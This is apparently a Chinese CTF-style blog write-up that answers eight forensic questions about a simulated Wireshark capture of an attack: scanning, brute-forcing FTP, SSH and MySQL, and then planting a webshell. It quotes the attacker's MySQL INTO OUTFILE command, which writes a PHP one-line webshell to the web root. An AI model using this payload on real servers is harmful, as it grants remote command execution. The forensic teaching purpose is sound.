# Wireshark数据包题目分析

数据包分析器又名嗅探（Sniffers），是一种网络流量数据分析的手段，常见于网络安全领域使用，也有用于业务分析领域，一般是指使用嗅探器对数据流的数据截获与分组分析（Packet analysis）。

 - 分析网络问题
 - 业务分析
 - 分析网络信息流通量
 - 网络大数据金融风险控制
 - 探测企图入侵网络的攻击
 - 探测由内部和外部的用户滥用网络资源
 - 探测网络入侵后的影响
 - 监测链接互联网宽频流量
 - 监测网络使用流量（包括内部用户，外部用户和系统）
 - 监测互联网和用户电脑的安全状态
 - 渗透与欺骗

**以上摘自百度**
**数据包是我自己模拟的，现在已经上传至csdn有兴趣的人可以去下载做一下。**
我们本章主要以案例数据包进行分析找出关键数据，现在我们来看以下案例要求。


1、某公司网络系统存在异常，猜测可能有黑客对公司的服务器实施了一系列的扫描和攻 击，使用 Wireshark 抓包分析软件查看并分析 PC20201 服务器 C:\Users\Public\Documents路径下的dump.pcapng数据包文件，找到黑客的IP地址， 并将黑客的 IP 地址作为 Flag 值（如：172.16.1.1）提交；
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119113708308.png)
我们从这一段数据包可以看出，192.168.52.132对192.168.52.139进行请求访问22端口(ssh服务)，通常情况下服务端不会主动对目标进行通信，所以我们判断黑客ip地址为192.168.52.132.

2.继续分析数据包文件dump.pcapng分析出黑客通过工具对目标服务器的哪些服务进行 了密码暴力枚举渗透测试，将服务对应的端口依照从小到大的顺序依次排列作为 Flag 值（如：77/88/99/166/1888）提交； 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119114604373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119114604656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119114616597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
从以上三张图片我们可以看出，黑客分别对21,22,3306端口进行了请求。故此得到黑客扫描的端口为21/22/3306，可能小伙伴会好奇了不是还有一个20端口吗？这里的20端口也是ftp服务，但是与21端口不同他的作用是用于传输数据的(21端口用来控制用户验证, 连接的建立和关闭)。关于20端口我们会在下文进行详细讲解。

3.继续分析数据包文件 dump.pcapng，找出黑客已经获取到目标服务器的基本信息，请 将黑客获取到的目标服务器主机名作为 Flag 值提交； 
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020011911521883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
我们进行过滤nbns数据包后进行追踪udp数据流可以得到主机名为metasploit，WINS服务器解析(NBNS数据包)，WINS服务器用于登记记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。可能使用工具nbtscan进行扫描的。

4.黑客扫描后可能直接对目标服务器的某个服务实施了攻击，继续查看数据包文件 dump.pcapng 分析出黑客成功破解了哪个服务的密码，并将该服务的版本号作为 Flag 值(如：5.1.10)提交； 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119115534365.png)
查看数据包，发现mysql服务成功登陆并在数据包后面可直接查看版本，可得服务版本为5.1.73

5、继续分析数据包文件 dump.pcapng，黑客通过数据库写入了木马,将写入的木马名称作 为 Flag 值提交（名称不包含后缀）； 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119115606882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
查看mysql数据包中执行的命令，黑客在成功登陆mysql数据库后对服务器网站进行上传了一句话木马，文件名为test.php.
黑客执行命令为:select '<?php system($_GET[cmd]);?>' into outfile '/var/www/html/test.php'

6、继续分析数据包文件 dump.pcapng，黑客通过数据库写入了木马,将黑客写入的一句话 木马的连接密码作为 Flag 值提交；

我们在上一步中已经得到黑客执行的命令，所以可以得到一句话木马的连接密码为cmd


7、继续分析数据包文件 dump.pcapng，找出黑客连接一句话木马后查看了什么文件，将 黑客查看的文件名称作为 Flag 值提交；

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119115957711.png)
进行过滤http数据包，可以查看黑客使用一句话木马进行查看的文件名，为flag.txt

8、继续分析数据包文件 dump.pcapng，黑客可能找到异常用户后再次对目标服务器的某 个服务进行了密码暴力枚举渗透，成功破解出服务的密码后登录到服务器中下载了一 张图片，将图片文件中的英文单词作为 Flag 值提交。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119120123434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200119120135497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
直接进行过滤ftp-data包，追踪tcp流，显示和保存数据为原始数据然后save as导出保存为图片格式，，即可得知下载的图片内容为hello,world!
**这里对ftp-data进行讲解，ftp-data主要是用户传输数据的对应的端口为20，所以20端口也称为FTP服务的数据端口。**

新年最后一更，年后更新就不定期更新了，因为事情比较多需要经常出差。
年后更新的方向大概就会偏向代码审计比较多一点了吧，年后我会把精力放到代码审计的学习中，在之前打比赛中我渗透主机后对web源码进行了代码审计得到了数据库密码和网站存在的逻辑漏洞最后牛逼了一波，这也让我明白了代码审计的重要性，所以我会去深入研究这一块了吧。

最后祝大家新年快乐!